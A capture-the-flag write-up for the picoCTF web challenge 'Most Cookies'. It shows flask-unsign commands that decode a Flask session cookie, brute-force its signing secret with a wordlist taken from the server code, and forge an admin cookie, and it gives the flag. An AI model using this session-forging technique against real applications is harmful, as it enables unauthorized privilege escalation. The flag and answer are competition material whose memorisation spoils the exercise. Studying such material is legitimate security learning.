# Most Cookies

```
AUTHOR: MADSTACKS

Description
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py http://mercury.picoctf.net:53700/
```

# Attempt

looking at the website, http://mercury.picoctf.net:53700/ i see it asks for a cookie. Looking in the given server.py shows some hard coded cookie names:
``` python
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
```
before i enter some, i look at the cookies for the page (hint was in the name). After abusing google, I found a way to decode cookies. I learnt they're encrypted by a keyword
using flask-usign, i attempt this:
`pip3 install flask-unsign`
```bash
flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YJF19g.HYf5X3SfpScwGTTQ6W0xMiy5pzE'`
# outputs
{'very_auth': 'blank'}

```
we'll come back to this later. I try entering a hardcoded cookie name into the website... and great! redirect to a /display site. Lets check the cookies:
`eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YJLKOg.bQ0mQBF1ShU_rhp_zf4BDXDEvvo`
This is different from the original cookie! lets decode it
```bash
flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YJLKOg.bQ0mQBF1ShU_rhp_zf4BDXDEvvo'
# outputs
{'very_auth': 'snickerdoodle'}
```
interesting! now lets go for that secret key. reading the flask-unsign website, https://book.hacktricks.xyz/pentesting/pentesting-web/flask you can find a section on brute forcing the key. lets try that
```bash
pip install flask-unsign[wordlist]
flask-unsign --unsign --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YJLKOg.bQ0mQBF1ShU_rhp_zf4BDXDEvvo'
# outputs 
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2176): -----BEGIN PRIVATE KEY-----TEN
[!] Failed to find secret key after 41668 attempts.xx
```
ah shit. failed :(. Lets try our own wordlist, what can we work with. Hows about the cookie_names array from the python code! 
```bash
flask-unsign --unsign --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YJLKOg.bQ0mQBF1ShU_rhp_zf4BDXDEvvo' --wordlist wordlist.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'
```
success!
secret key: 'peanut butter'

now lets make our own cookie with value {'very_auth': 'admin'}

```bash
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'peanut butter'
# output
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YJLL5w.-TvJoF9eDG66wBNbg59tM5Yxf_Q
```

entering this into the page gives the flag!

# Flag:

Flag: picoCTF{pwn_4ll_th3_cook1E5_3646b931}

# Notes

massive thanks to https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Web%20Exploitation/Most%20Cookies/MostCookies.md otherwise i would've struggled a lot more with this one







{'very_auth': 'admin'}

eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YJF3yw.cmT6WDZYILW85Bw82Ato1H69BuM

flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9Cg==.YJF19g.HYf5X3SfpScwGTTQ6W0xMiy5pzE'